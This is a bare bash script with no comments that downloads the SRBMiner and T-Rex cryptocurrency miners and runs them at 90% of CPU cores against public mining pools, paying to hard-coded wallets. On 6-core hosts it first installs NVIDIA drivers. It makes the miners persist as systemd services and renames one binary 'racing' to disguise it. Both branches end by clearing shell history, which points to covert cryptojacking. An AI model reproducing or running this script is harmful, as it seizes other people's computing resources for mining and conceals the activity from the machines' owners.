cd /home
myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
noCore=$(nproc --all)
usingcore=$((noCore*90/100))
if [[ $noCore -eq 6 ]]
then
    	sudo apt-get install linux-headers-$(uname -r) -y
	distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
	sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
	sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
	sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
	sudo apt-key del 7fa2af80
	sudo rm /etc/apt/sources.list.d/cuda.list
	sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
	sudo dpkg -i cuda-keyring_1.0-1_all.deb
	sudo apt-get update
	sudo apt-get -y install cuda-drivers
	sudo apt-get install libcurl4 -y
	sudo apt-get install cuda-drivers-515 -y
	sudo apt-get install cuda-drivers-fabricmanager-515 -y
	sudo systemctl enable nvidia-fabricmanager
	sudo systemctl start nvidia-fabricmanager
	sudo nvidia-smi mig -cgi 0 -C
	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
	sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
	sudo ./SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads ${usingcore} --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s.${myworker}_bat_${noCore} --password hybrid &
	sudo bash -c 'echo -e "[Unit]\nDescription=SRBMiner-MULTI\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_bat_${noCore}_re'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/SRBMiner-MULTI.service'
	sudo systemctl daemon-reload
	sudo systemctl enable SRBMiner-MULTI.service
	sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
	sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
	sudo mv t-rex racing
	sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_bat_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
	sudo systemctl daemon-reload
	sudo systemctl enable racing.service
	sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_bat_${noCore} -p x &
	history -c
else
	sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.1/SRBMiner-Multi-1-1-1-Linux.tar.xz
	sudo tar -xvf SRBMiner-Multi-1-1-1-Linux.tar.xz
	sudo ./SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads ${usingcore} --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s.${myworker}_bat_nogpu_${noCore} --password hybrid &
	sudo bash -c 'echo -e "[Unit]\nDescription=SRBMiner-MULTI\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/SRBMiner-Multi-1-1-1/SRBMiner-MULTI --disable-gpu --algorithm verushash --cpu-threads "'${usingcore}'" --pool eu.luckpool.net:3956 --wallet RBuLg5R4VagKzG5dM6DGG5VMiHi9YUva7s."'${myworker}_bat_${noCore}_re'" --password hybrid\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/SRBMiner-MULTI.service'
	sudo systemctl daemon-reload
	sudo systemctl enable SRBMiner-MULTI.service
	history -c
fi
